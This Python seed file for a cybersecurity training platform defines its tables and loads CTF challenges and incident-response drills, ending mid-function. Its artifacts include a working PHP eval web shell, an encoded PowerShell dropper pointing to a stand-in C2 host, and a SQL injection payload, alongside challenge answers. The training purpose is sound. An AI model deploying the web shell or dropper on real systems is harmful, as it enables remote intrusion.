"""
database.py
===========
Threat Vector - SQLite Database Layer & Seed Engine
---------------------------------------------------
Handles SQLite database initialization, table creation, seed ingestion
from CSV, peer trainee seeding, and helper queries.

Tables:
- users: Trainee accounts, password hashes, defense scores, roles
- scenarios: 28+ rich simulation drills (Phishing, OTP, Impersonation, etc.)
- drill_responses: Trainee answers, verdicts, chosen indicators, timestamps
- ctf_challenges: Tactical range challenges with flags, artifacts, hints
- ctf_submissions: Log of trainee flag captures
- war_room_incidents: Incident response simulated scenarios & phases
- war_room_logs: Trainee containment actions and tactical outcomes
- audit_logs: Real-time security event log
"""

import sqlite3
import csv
import json
import os
from werkzeug.security import generate_password_hash

DB_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "database.db")
SCENARIOS_CSV = os.path.join(os.path.dirname(os.path.abspath(__file__)), "data", "scenarios.csv")

def get_db_connection():
    """Returns a SQLite connection with Row factory enabled for dictionary-like access."""
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    """Initializes SQLite schema and populates default scenarios, CTF challenges, and users."""
    conn = get_db_connection()
    cursor = conn.cursor()

    # 1. Users Table
    cursor.execute("""
    CREATE TABLE IF NOT EXISTS users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT UNIQUE NOT NULL,
        password_hash TEXT NOT NULL,
        role TEXT DEFAULT 'Trainee Analyst',
        defense_score INTEGER DEFAULT 0,
        drills_completed INTEGER DEFAULT 0,
        ctf_completed INTEGER DEFAULT 0,
        warroom_completed INTEGER DEFAULT 0,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )
    """)

    # 2. Scenarios / Drills Table
    cursor.execute("""
    CREATE TABLE IF NOT EXISTS scenarios (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        category TEXT NOT NULL,
        difficulty TEXT NOT NULL,
        title TEXT NOT NULL,
        sender TEXT NOT NULL,
        subject TEXT NOT NULL,
        content TEXT NOT NULL,
        indicators_json TEXT NOT NULL,
        correct_indicators_json TEXT NOT NULL,
        is_malicious INTEGER NOT NULL,
        explanation TEXT NOT NULL,
        mitre_tactic TEXT NOT NULL,
        points INTEGER DEFAULT 50
    )
    """)

    # 3. Drill Responses Table
    cursor.execute("""
    CREATE TABLE IF NOT EXISTS drill_responses (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER NOT NULL,
        scenario_id INTEGER NOT NULL,
        user_verdict INTEGER NOT NULL,
        is_correct INTEGER NOT NULL,
        selected_indicators_json TEXT,
        score_awarded INTEGER DEFAULT 0,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        FOREIGN KEY (user_id) REFERENCES users(id),
        FOREIGN KEY (scenario_id) REFERENCES scenarios(id)
    )
    """)

    # 4. CTF Challenges Table
    cursor.execute("""
    CREATE TABLE IF NOT EXISTS ctf_challenges (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        title TEXT NOT NULL,
        category TEXT NOT NULL,
        difficulty TEXT NOT NULL,
        description TEXT NOT NULL,
        artifact_data TEXT NOT NULL,
        hint TEXT NOT NULL,
        flag TEXT NOT NULL,
        points INTEGER DEFAULT 100
    )
    """)

    # 5. CTF Submissions Table
    cursor.execute("""
    CREATE TABLE IF NOT EXISTS ctf_submissions (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER NOT NULL,
        challenge_id INTEGER NOT NULL,
        submitted_flag TEXT NOT NULL,
        is_correct INTEGER NOT NULL,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        FOREIGN KEY (user_id) REFERENCES users(id),
        FOREIGN KEY (challenge_id) REFERENCES ctf_challenges(id)
    )
    """)

    # 6. Incident Response War Room Table
    cursor.execute("""
    CREATE TABLE IF NOT EXISTS war_room_incidents (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        title TEXT NOT NULL,
        threat_type TEXT NOT NULL,
        severity TEXT NOT NULL,
        description TEXT NOT NULL,
        phases_json TEXT NOT NULL,
        points INTEGER DEFAULT 200
    )
    """)

    # 7. War Room Logs
    cursor.execute("""
    CREATE TABLE IF NOT EXISTS war_room_logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER NOT NULL,
        incident_id INTEGER NOT NULL,
        phase_index INTEGER NOT NULL,
        chosen_option_index INTEGER NOT NULL,
        points_earned INTEGER NOT NULL,
        outcome_note TEXT,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        FOREIGN KEY (user_id) REFERENCES users(id),
        FOREIGN KEY (incident_id) REFERENCES war_room_incidents(id)
    )
    """)

    # 8. Audit Logs Table
    cursor.execute("""
    CREATE TABLE IF NOT EXISTS audit_logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER,
        action TEXT NOT NULL,
        details TEXT,
        ip_address TEXT DEFAULT '127.0.0.1',
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )
    """)

    
    # 8. Knowledge Check: User Progress Tracking
    cursor.execute("""
    CREATE TABLE IF NOT EXISTS knowledge_progress (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER NOT NULL,
        module_id INTEGER NOT NULL,
        difficulty TEXT NOT NULL,
        best_score INTEGER DEFAULT 0,
        total_questions INTEGER DEFAULT 20,
        attempts_count INTEGER DEFAULT 0,
        completed INTEGER DEFAULT 0,
        last_completed_at TIMESTAMP,
        UNIQUE(user_id, module_id, difficulty),
        FOREIGN KEY (user_id) REFERENCES users(id)
    )
    """)

    # 9. Knowledge Check: Quiz Attempts History
    cursor.execute("""
    CREATE TABLE IF NOT EXISTS knowledge_attempts (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER NOT NULL,
        module_id INTEGER NOT NULL,
        difficulty TEXT NOT NULL,
        score INTEGER NOT NULL,
        total_questions INTEGER DEFAULT 20,
        percentage REAL NOT NULL,
        answers_json TEXT,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        FOREIGN KEY (user_id) REFERENCES users(id)
    )
    """)

    # 10. Knowledge Check: Active In-Progress Sessions (resilience against refresh)
    cursor.execute("""
    CREATE TABLE IF NOT EXISTS knowledge_active_sessions (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        session_id TEXT UNIQUE NOT NULL,
        user_id INTEGER NOT NULL,
        module_id INTEGER NOT NULL,
        difficulty TEXT NOT NULL,
        current_index INTEGER DEFAULT 0,
        questions_json TEXT NOT NULL,
        answers_json TEXT NOT NULL,
        is_completed INTEGER DEFAULT 0,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        FOREIGN KEY (user_id) REFERENCES users(id)
    )
    """)

    # 11. Security Audit Lab: Student Submissions per Stage
    cursor.execute("""
    CREATE TABLE IF NOT EXISTS audit_submissions (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER NOT NULL,
        mission_id TEXT NOT NULL,
        stage_id INTEGER NOT NULL,
        weakness_answer TEXT,
        evidence_answer TEXT,
        risk_level TEXT,
        impact_answer TEXT,
        recommendation_answer TEXT,
        weakness_score INTEGER DEFAULT 0,
        evidence_score INTEGER DEFAULT 0,
        risk_score INTEGER DEFAULT 0,
        impact_score INTEGER DEFAULT 0,
        recommendation_score INTEGER DEFAULT 0,
        total_score INTEGER DEFAULT 0,
        feedback_json TEXT,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        FOREIGN KEY (user_id) REFERENCES users(id),
        UNIQUE(user_id, mission_id, stage_id)
    )
    """)

    # 12. Security Audit Lab: Overall Mission Progress per User
    cursor.execute("""
    CREATE TABLE IF NOT EXISTS audit_progress (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER NOT NULL,
        mission_id TEXT NOT NULL,
        current_stage INTEGER DEFAULT 1,
        completed_stages INTEGER DEFAULT 0,
        is_completed INTEGER DEFAULT 0,
        average_score REAL DEFAULT 0.0,
        total_score INTEGER DEFAULT 0,
        final_report_json TEXT,
        updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        FOREIGN KEY (user_id) REFERENCES users(id),
        UNIQUE(user_id, mission_id)
    )
    """)

    conn.commit()

    # --- SEED DATA ---
    seed_users(conn)
    seed_scenarios(conn)
    seed_ctf(conn)
    seed_war_room(conn)

    conn.close()
    print("[+] Database initialized successfully with all tables and seeds.")

def seed_users(conn):
    """Seeds default demo trainee account and realistic peer analysts for the leaderboard."""
    cursor = conn.cursor()
    cursor.execute("SELECT COUNT(*) FROM users")
    if cursor.fetchone()[0] == 0:
        default_password = generate_password_hash("password123")
        peer_users = [
            ("cadet", default_password, "Security Trainee", 350, 6, 2, 1),
            ("sarah_infosec", default_password, "Senior SOC Analyst", 1450, 24, 5, 4),
            ("marcus_cyber", default_password, "Threat Hunter", 1280, 21, 4, 3),
            ("elena_cert", default_password, "Incident Responder", 980, 16, 3, 3),
            ("alex_soc", default_password, "Junior Analyst", 720, 12, 2, 2),
            ("david_dfir", default_password, "Digital Forensics Lead", 580, 9, 2, 1),
        ]
        cursor.executemany("""
            INSERT INTO users (username, password_hash, role, defense_score, drills_completed, ctf_completed, warroom_completed)
            VALUES (?, ?, ?, ?, ?, ?, ?)
        """, peer_users)
        conn.commit()
        print("[+] Seeded 6 baseline users into 'users' table.")

def seed_scenarios(conn):
    """Loads drills dataset from scenarios.csv into SQLite if empty."""
    cursor = conn.cursor()
    cursor.execute("SELECT COUNT(*) FROM scenarios")
    if cursor.fetchone()[0] == 0 and os.path.exists(SCENARIOS_CSV):
        with open(SCENARIOS_CSV, mode="r", encoding="utf-8") as f:
            reader = csv.DictReader(f)
            rows = []
            for r in reader:
                rows.append((
                    int(r["id"]),
                    r["category"],
                    r["difficulty"],
                    r["title"],
                    r["sender"],
                    r["subject"],
                    r["content"],
                    r["indicators_json"],
                    r["correct_indicators_json"],
                    int(r["is_malicious"]),
                    r["explanation"],
                    r["mitre_tactic"],
                    int(r["points"])
                ))
            cursor.executemany("""
                INSERT OR REPLACE INTO scenarios 
                (id, category, difficulty, title, sender, subject, content, indicators_json, correct_indicators_json, is_malicious, explanation, mitre_tactic, points)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            """, rows)
            conn.commit()
            print(f"[+] Seeded {len(rows)} scenarios from scenarios.csv.")

def seed_ctf(conn):
    """Seeds interactive CTF tactical range missions."""
    cursor = conn.cursor()
    cursor.execute("SELECT COUNT(*) FROM ctf_challenges")
    if cursor.fetchone()[0] == 0:
        challenges = [
            (
                "SSH Brute Force Intrusion Detective",
                "Log Analysis",
                "Cadet",
                "A Linux authentication server was subjected to a high-frequency credential stuffing attack. Inspect the auth.log excerpt below to identify which IP address launched the attack and which username was successfully breached.",
                """Oct 19 02:14:01 prod-auth sshd[14201]: Failed password for invalid user admin from 192.168.1.105 port 42102 ssh2
Oct 19 02:14:03 prod-auth sshd[14205]: Failed password for root from 192.168.1.105 port 42104 ssh2
Oct 19 02:14:05 prod-auth sshd[14210]: Failed password for guest from 192.168.1.105 port 42108 ssh2
Oct 19 02:14:07 prod-auth sshd[14218]: Accepted password for sysadmin from 192.168.1.105 port 42110 ssh2
Oct 19 02:14:08 prod-auth sshd[14218]: pam_unix(sshd:session): session opened for user sysadmin by (uid=0)""",
                "Look for the single log line containing 'Accepted password for' to reveal the breached username and the source IP.",
                "flag{192.168.1.105_sysadmin}",
                100
            ),
            (
                "Obfuscated Web Shell Backdoor Inspection",
                "Web Shell Signatures",
                "Analyst",
                "During a forensic web server audit, security teams found an anomalous PHP script masquerading as an image upload. De-obfuscate the hidden authorization key token embedded in the script.",
                """<?php
// Threat Vector Lab - Web Shell Forensic Capture
// File: /var/www/html/uploads/avatar_preview.png.php
$k = "c99_backdoor_auth_token_9918";
if (isset($_POST['shell_cmd']) && $_COOKIE['auth_key'] === md5($k)) {
    $exec_code = base64_decode($_POST['shell_cmd']);
    eval($exec_code);
}
?>""",
                "The attacker enforces authentication via an MD5 comparison against variable $k. The flag is the exact string inside $k.",
                "flag{c99_backdoor_auth_token_9918}",
                120
            ),
            (
                "Intercepted Threat Actor C2 Cipher (ROT13)",
                "Cryptography",
                "Cadet",
                "SOC analysts intercepted an encoded beacon string transmitted from an infected workstation to an external Command & Control server. Intelligence suggests the attacker used classic ROT13 substitution.",
                """Intercepted Beacon Payload:
synt{ebg13_punyyratr_qrpbqrq_fhpprff}""",
                "Apply ROT13 decoding (shift each letter 13 characters in the alphabet). Letters a-z wrap around.",
                "flag{rot13_challenge_decoded_success}",
                80
            ),
            (
                "PowerShell Encoded Command Forensic Decryption",
                "Header & Payload Forensics",
                "Analyst",
                "Windows Event ID 4688 logged an obfuscated PowerShell dropper executed via Task Scheduler. Decode the Base64 command payload to reveal the remote C2 callback script URL.",
                """Process Command Line:
powershell.exe -NoP -NonI -W Hidden -Enc aHR0cDovL2V2aWwtYzItbGlzdGVuZXIuZGFya25ldC9wYXlsb2FkLnBzMQ==""",
                "The string following '-Enc' is Base64 encoded. Decode 'aHR0cDovL2V2aWwtYzItbGlzdGVuZXIuZGFya25ldC9wYXlsb2FkLnBzMQ==' to reveal the URL.",
                "flag{http://evil-c2-listener.darknet/payload.ps1}",
                150
            ),
            (
                "SQL Injection Web Access Log Detective",
                "SQL Injection Detective",
                "Analyst",
                "The web server WAF triggered a SQL injection signature. Analyze the Apache access log record below and extract the target database table being probed by the adversary.",
                """10.0.0.45 - - [19/Oct/2026:14:22:10 +0000] "GET /products.php?id=1%20UNION%20SELECT%201,column_name,3%20FROM%20information_schema.columns%20WHERE%20table_name='admin_credentials' HTTP/1.1" 200 4810""",
                "Inspect the SQL query inside the URL. Locate the value specified after 'table_name='.",
                "flag{admin_credentials}",
                110
            ),
            (
                "Ransomware Incident Note Identifier",
                "Ransomware Forensics",
                "Cadet",
                "An infected workstation on the accounting network was hit with ransomware. The desktop background was replaced with a ransom note. Find the attacker's unique victim identifier flag.",
                """==========================================================
!!! LOCKBIT 3.0 ENTERPRISE SYSTEM ENCRYPTION !!!
All of your virtual machines and SQL databases have been encrypted.
Do not modify filenames or attempt third-party recovery tools.
To negotiate decryption key, communicate with victim token:
flag{victim_id_882910_lockbit_recovered}
==========================================================""",
                "Read through the text of the ransom note to find the flag formatted string at the bottom.",
                "flag{victim_id_882910_lockbit_recovered}",
                90
            )
        ]
        cursor.executemany("""
            INSERT INTO ctf_challenges (title, category, difficulty, description, artifact_data, hint, flag, points)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?)
        """, challenges)
        conn.commit()
        print(f"[+] Seeded {len(challenges)} CTF challenges.")

def seed_war_room(conn):
    """Seeds simulated incident response scenarios with multi-phase decision branches."""
    cursor = conn.cursor()
    cursor.execute("SELECT COUNT(*) FROM war_room_incidents")
    if cursor.fetchone()[0] == 0:
        incidents = [
            (
                "Operation BlackOut: Domain Controller Ransomware Outbreak",
                "Ransomware Outbreak",
                "CRITICAL",
                "At 03:14 AM, EDR sensors trigger mass file modification alerts on the primary Active Directory Domain Controller (DC-01). Workstations across the Finance VLAN are displaying ransom notes with '.locked' extensions. The adversary is using compromised Domain Admin credentials to propagate via SMB.",
                json.dumps([
                    {
                        "phase_title": "Phase 1: Detection & Triage",
                        "scenario_context": "Ransomware is spreading across the subnet through SMB port 445. Several departmental file servers are currently being encrypted.",
                        "question": "What is the most effective immediate containment triage action?",
                        "options": [
                            {"text": "Isolate the affected Finance VLAN at the core network switch and block inter-VLAN SMB (port 445).", "points": 50, "consequence": "CORRECT: Micro-segmentation stops ransomware lateral movement without taking down unrelated medical or production networks."},
                            {"text": "Perform a hard power-down of all server racks immediately.", "points": -20, "consequence": "CRITICAL ERROR: Hard shutdown destroys volatile RAM evidence, uncommitted transaction logs, and can corrupt disk recovery partitions."},
                            {"text": "Send a broadcast company email warning staff not to click links.", "points": -30, "consequence": "INEFFECTIVE: The attack is already executed and automated. An email will not halt active machine-speed encryption."}
                        ]
                    },
                    {
                        "phase_title": "Phase 2: Identity & Credential Containment",
                        "scenario_context": "The attacker was observed using a stolen Domain Admin token. Kerberos ticket-granting service tickets (TGT) have been forged.",
                        "question": "How do you invalidate the attacker's administrative persistence across Active Directory?",
                        "options": [
                            {"text": "Perform a double reset of the Active Directory KRBTGT account password and revoke all active Kerberos sessions.", "points": 50, "consequence": "EXCELLENT SOC ACTION: Resetting the KRBTGT account twice invalidates Golden Tickets and completely kicks the adversary off the domain."},
                            {"text": "Simply change the password of the local Administrator account on DC-01.", "points": 0, "consequence": "INSUFFICIENT: Active Kerberos Golden Tickets remain valid for up to 10 hours regardless of individual password changes."},
                            {"text": "Pay the threat actor's $50,000 cryptocurrency demand to get their decryptor tool.", "points": -50, "consequence": "POLICY VIOLATION: Paying ransoms does not guarantee decryption, funds criminal syndicates, and often leaves stealth backdoors in place."}
                        ]
                    },
                    {
                        "phase_title": "Phase 3: Threat Eradication",
                        "scenario_context": "VLAN isolation and credential invalidation are in effect. Now forensic teams must clean the infected systems.",
                        "question": "What is the industry-standard remediation procedure for compromised Domain Controllers?",
                        "options": [
                            {"text": "Rebuild and re-promote DC-01 from clean, verified bare-metal golden master images rather than attempting cleaning.", "points": 50, "consequence": "BEST PRACTICE: For high-tier domain controllers, never trust in-place antivirus cleaning. Rebuilding guarantees no kernel-level rootkits survive."},
                            {"text": "Run a standard consumer antivirus full-system scan and delete detected .exe files.", "points": -15, "consequence": "HIGH RISK: Modern ransomware droppers employ rootkits and memory injection that evade standard file-based scanner cleanup."},
                            {"text": "Simply delete the '.locked' extensions and ransom text notes.", "points": -30, "consequence": "CRITICAL MISUNDERSTANDING: Removing file extensions does not reverse AES/RSA cryptographic encryption."}
                        ]
                    },
                    {
                        "phase_title": "Phase 4: Recovery & Post-Mortem Hardening",
                        "scenario_context": "The domain has been rebuilt. Systems are ready for restoration. Executive leadership demands assurance against re-infection.",
                        "question": "Which recovery strategy ensures resilient data restoration and future defense?",
                        "options": [
                            {"text": "Restore databases from immutable, air-gapped offline backups and mandate FIDO2 hardware MFA on all administrative logins.", "points": 50, "consequence": "SECURITY TRIUMPH: Air-gapped backups prevent ransomware tampering, and hardware MFA stops future credential theft entirely."},
                            {"text": "Restore from the hot NAS backup share that was mapped to DC-01 during the attack.", "points": -25, "consequence": "CATASTROPHIC: Hot-mapped network shares were also targeted and encrypted by the ransomware wiper."},
                            {"text": "Resume operations immediately without making any firewall or policy changes.", "points": -20, "consequence": "UNSAFE: Root cause vulnerabilities remain unpatched, exposing the organization to repeat intrusion."}
                        ]
                    }
                ]),
                200
            ),
            (
                "Operation Hydra: Distributed Credential Stuffing & Account Takeover",
                "Credential Stuffing",
                "HIGH",
                "At 09:20 AM, web portal monitoring triggers an alarm: 65,000 failed login requests per minute are hitting '/api/v1/login'. Requests are distributed across 4,200 residential proxy IPs testing credentials from a recent darknet credential dump.",
                json.dumps([
                    {
                        "phase_title": "Phase 1: Traffic Analysis & Rate Limiting",
                        "scenario_context": "Customer portal servers are experiencing 90% CPU load. Legitimate users are experiencing service timeouts.",
                        "question": "What edge defense action mitigates the incoming credential flood?",
                        "options": [
                            {"text": "Deploy WAF dynamic rate limiting per IP and enforce Cloudflare/hCaptcha challenge on failed attempts.", "points": 50, "consequence": "SUCCESSFUL MITIGATION: Bot traffic drops by 94% as automated scripts cannot solve cryptographic CAPTCHA puzzles at scale."},
                            {"text": "Block IP addresses one by one manually in the firewall.", "points": -25, "consequence": "FUTILE: The attack uses over 4,000 rotating residential IPs. Manual blocking is impossible to keep pace with."},
                            {"text": "Shut down the customer portal entirely for the next 24 hours.", "points": -15, "consequence": "UNACCEPTABLE DOWNTIME: Excessive business interruption when edge filtering solutions are readily available."}
                        ]
                    },
                    {
                        "phase_title": "Phase 2: Compromise Identification",
                        "scenario_context": "Despite rate limiting, approximately 180 customer accounts had matching passwords and were successfully authenticated by the botnet.",
                        "question": "How do you protect the 180 compromised accounts immediately?",
                        "options": [
                            {"text": "Revoke all active session JWT tokens for those 180 accounts, force a password reset, and flag them for step-up MFA verification.", "points": 50, "consequence": "PRECISE REMEDIATION: Invalidates rogue sessions immediately and secures customer assets before unauthorized wire transfers occur."},
                            {"text": "Leave the accounts active and monitor what the attackers do for the next 48 hours.", "points": -30, "consequence": "SEVERE RISK: Attackers can drain stored funds, siphon PII, or change recovery emails in seconds."},
                            {"text": "Delete the 180 user accounts completely from the database.", "points": -20, "consequence": "POOR CUSTOMER EXPERIENCE: Deleting legitimate accounts destroys customer history and orders."}
                        ]
                    },
                    {
                        "phase_title": "Phase 3: Prevention & Strategic Hardening",
                        "scenario_context": "The immediate attack has subsided. The CISO requests permanent architectural defenses against future credential stuffing.",
                        "question": "Which long-term defense eliminates credential stuffing vulnerabilities?",
                        "options": [
                            {"text": "Integrate HaveIBeenPwned API check on password creation and enforce mandatory Multi-Factor Authentication (MFA).", "points": 50, "consequence": "STRATEGIC MASTERY: Prohibits users from selecting breached passwords and MFA renders stolen passwords useless on their own."},
                            {"text": "Increase minimum password length from 8 to 9 characters.", "points": 5, "consequence": "INSUFFICIENT: Attackers are using already-compromised passwords; minor length bumps do not thwart credential stuffing."},
                            {"text": "Disable user logins entirely and switch to phone-call ordering.", "points": -30, "consequence": "REGRESSIVE: Infeasible for modern digital enterprise services."}
                        ]
                    }
                ]),
                150
            ),
            (
                "Operation GhostExfil: Executive Spear-Phishing & Data Theft",
                "Data Exfiltration",
                "HIGH",
                "The Chief Financial Officer clicked on an email claiming to contain 'Revised_Q4_Board_Bonus.docm'. EDR alerted that WINWORD.EXE spawned 'powershell.exe', which injected into 'svchost.exe' and initiated outbound HTTPS beacons to an IP in Eastern Europe.",
                json.dumps([
                    {
                        "phase_title": "Phase 1: Host Isolation & Memory Preservation",
                        "scenario_context": "The malicious process is active in memory and attempting to dump LSASS credentials.",
                        "question": "What is the critical initial response step for the infected CFO workstation?",
                        "options": [
                            {"text": "Trigger immediate EDR network isolation while keeping the machine powered on to capture live RAM dump.", "points": 50, "consequence": "PERFECT FORENSICS: Network isolation stops outbound exfiltration while preserving volatile memory encryption keys."},
                            {"text": "Immediately unplug the power cord from the wall.", "points": -20, "consequence": "EVIDENCE LOSS: Cutting power instantly wipes RAM, losing injected shellcode, C2 encryption keys, and active process trees."},
                            {"text": "Tell the CFO to delete the email from their Outlook Trash folder.", "points": -25, "consequence": "USELESS: The malicious macro already executed in background memory; deleting the email has zero effect."}
                        ]
                    },
                    {
                        "phase_title": "Phase 2: Network & C2 Severance",
                        "scenario_context": "Network forensics reveals the beacon destination is 185.220.101.42 over TCP port 443.",
                        "question": "What enterprise-wide action prevents other internal endpoints from connecting to this adversary?",
                        "options": [
                            {"text": "Push an enterprise-wide firewall and DNS Sinkhole block for 185.220.101.42 and sweep SIEM logs for any other historical connections.", "points": 50, "consequence": "THREAT HUNTING EXCELLENCE: Blocks adversary command channel enterprise-wide and uncovers any secondary patient-zero machines."},
                            {"text": "Send a warning note to the ISP hosting the attacker IP.", "points": -10, "consequence": "INEFFECTIVE: Bulletproof offshore hosting providers ignore abuse reports, wasting critical incident response minutes."},
                            {"text": "Ignore network blocks and try to hack back into the attacker's server.", "points": -50, "consequence": "ILLEGAL: 'Hacking back' violates the Computer Fraud and Abuse Act (CFAA) and risks attacking innocent compromised proxies."}
                        ]
                    },
                    {
                        "phase_title": "Phase 3: Identity & Privilege Containment",
                        "scenario_context": "LSASS memory dumps indicate the CFO's corporate credentials and session cookies were scraped.",
                        "question": "What identity protection measures must be deployed?",
                        "options": [
                            {"text": "Revoke the CFO's active enterprise sessions, reset passwords, invalidate cloud OAuth tokens, and audit ERP financial access logs.", "points": 50, "consequence": "COMPREHENSIVE CONTAINMENT: Ensures stolen cookies and OAuth tokens cannot be used to conduct unauthorized wire transfers."},
                            {"text": "Ask the CFO to change their Netflix password.", "points": -25, "consequence": "IRRELEVANT: Corporate financial access was compromised, not personal media streaming."},
                            {"text": "Assume the CFO's account is safe because they have antivirus installed.", "points": -30, "consequence": "DANGEROUS: Info-stealers routinely bypass traditional signature-based antivirus."}
                        ]
                    }
                ]),
                150
            )
        ]
        cursor.executemany("""
            INSERT INTO war_room_incidents (title, threat_type, severity, description, phases_json, points)
            VALUES (?, ?, ?, ?, ?, ?)
        """, incidents)
        conn.commit()
        print(f"[+] Seeded {len(incidents)} War Room incidents.")

def log_audit_event(user_id, action, details="", ip="127.0.0.1"):
    """Inserts a record into audit_logs table."""
    try:
        conn = get_db_connection()
        conn.execute("""
            INSERT INTO audit_logs (user_id, action, details, ip_address)
            VALUES (?, ?, ?, ?)
        """, (user_id, action, details, ip))
        conn.commit()
        conn.close()
    except Exception as e:
        print(f"[-] Audit log error: {e}")



# =====================================================================
# KNOWLEDGE CHECK HELPER FUNCTIONS
# =====================================================================

def get_user_knowledge_progress(user_id):
    """
    Retrieves progress across all 8 modules and 3 difficulties for a user.
    Returns:
        dict: {
            'modules': {
                module_id: {
                    'Easy': {'best_score': 0, 'completed': False, 'attempts_count': 0},
                    'Intermediate': {...},
                    'Hard': {...},
                    'completed_count': int,
                    'is_module_completed': bool
                } for module_id in 1..8
            },
            'summary': {
                'total_levels_completed': int,
                'total_attempts': int,
                'modules_fully_completed': int,
                'total_best_score': int
            }
        }
    """
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("""
        SELECT module_id, difficulty, best_score, total_questions, attempts_count, completed, last_completed_at
        FROM knowledge_progress
        WHERE user_id = ?
    """, (user_id,))
    rows = cursor.fetchall()
    conn.close()

    modules_progress = {}
    for m_id in range(1, 9):
        modules_progress[m_id] = {
            "Easy": {"best_score": 0, "total_questions": 20, "completed": False, "attempts_count": 0, "last_completed_at": None},
            "Intermediate": {"best_score": 0, "total_questions": 20, "completed": False, "attempts_count": 0, "last_completed_at": None},
            "Hard": {"best_score": 0, "total_questions": 20, "completed": False, "attempts_count": 0, "last_completed_at": None},
            "completed_count": 0,
            "is_module_completed": False
        }

    total_levels_completed = 0
    total_attempts = 0
    total_best_score = 0

    for row in rows:
        m_id = row["module_id"]
        diff = row["difficulty"]
        if m_id in modules_progress and diff in modules_progress[m_id]:
            is_comp = bool(row["completed"])
            modules_progress[m_id][diff] = {
                "best_score": row["best_score"] or 0,
                "total_questions": row["total_questions"] or 20,
                "completed": is_comp,
                "attempts_count": row["attempts_count"] or 0,
                "last_completed_at": row["last_completed_at"]
            }
            if is_comp:
                total_levels_completed += 1
            total_attempts += (row["attempts_count"] or 0)
            total_best_score += (row["best_score"] or 0)

    modules_fully_completed = 0
    for m_id, m_data in modules_progress.items():
        comp_count = sum(1 for d in ["Easy", "Intermediate", "Hard"] if m_data[d]["completed"])
        m_data["completed_count"] = comp_count
        m_data["is_module_completed"] = (comp_count == 3)
        if comp_count == 3:
            modules_fully_completed += 1

    return {
        "modules": modules_progress,
        "summary": {
            "total_levels_completed": total_levels_completed,
            "total_attempts": total_attempts,
            "modules_fully_completed": modules_fully_completed,
            "total_best_score": total_best_score
        }
    }


def get_module_knowledge_progress(user_id, module_id):
    """Retrieves progress for a single module across Easy, Intermediate, Hard."""
    all_prog = get_user_knowledge_progress(user_id)
    return all_prog["modules"].get(module_id, {
        "Easy": {"best_score": 0, "total_questions": 20, "completed": False, "attempts_count": 0},
        "Intermediate": {"best_score": 0, "total_questions": 20, "completed": False, "attempts_count": 0},
        "Hard": {"best_score": 0, "total_questions": 20, "completed": False, "attempts_count": 0},
        "completed_count": 0,
        "is_module_completed": False
    })


def create_or_get_active_session(session_id, user_id, module_id, difficulty, questions=None):
    """
    Creates or retrieves an active in-progress quiz session.
    If session exists, returns it. If not, and questions are provided, creates it.
    """
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("""
        SELECT id, session_id, user_id, module_id, difficulty, current_index, questions_json, answers_json, is_completed
        FROM knowledge_active_sessions
        WHERE session_id = ? AND user_id = ?
    """, (session_id, user_id))
    row = cursor.fetchone()

    if row:
        session_data = {
            "id": row["id"],
            "session_id": row["session_id"],
            "user_id": row["user_id"],
            "module_id": row["module_id"],
            "difficulty": row["difficulty"],
            "current_index": row["current_index"],
            "questions": json.loads(row["questions_json"]),
            "answers": json.loads(row["answers_json"]),
            "is_completed": bool(row["is_completed"])
        }
        conn.close()
        return session_data

    if questions is not None:
        q_json = json.dumps(questions)
        a_json = json.dumps([])
        cursor.execute("""
            INSERT INTO knowledge_active_sessions (session_id, user_id, module_id, difficulty, current_index, questions_json, answers_json, is_completed)
            VALUES (?, ?, ?, ?, 0, ?, ?, 0)
        """, (session_id, user_id, module_id, difficulty, q_json, a_json))
        conn.commit()
        conn.close()
        return {
            "session_id": session_id,
            "user_id": user_id,
            "module_id": module_id,
            "difficulty": difficulty,
            "current_index": 0,
            "questions": questions,
            "answers": [],
            "is_completed": False
        }

    conn.close()
    return None


def get_active_session(session_id, user_id):
    """Fetches an existing active session."""
    return create_or_get_active_session(session_id, user_id, None, None, questions=None)


def save_session_answer(session_id, user_id, question_index, answer_record):
    """
    Saves an answer for the given question index, updating current_index and answers_json.
    """
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("""
        SELECT answers_json, current_index, questions_json FROM knowledge_active_sessions
        WHERE session_id = ? AND user_id = ?
    """, (session_id, user_id))
    row = cursor.fetchone()
    if not row:
        conn.close()
        return False

    answers = json.loads(row["answers_json"])
    questions = json.loads(row["questions_json"])

    # Ensure answers list is long enough or replace/append
    while len(answers) <= question_index:
        answers.append(None)
    answers[question_index] = answer_record

    next_index = question_index + 1
    is_completed = 1 if next_index >= len(questions) else 0

    cursor.execute("""
        UPDATE knowledge_active_sessions
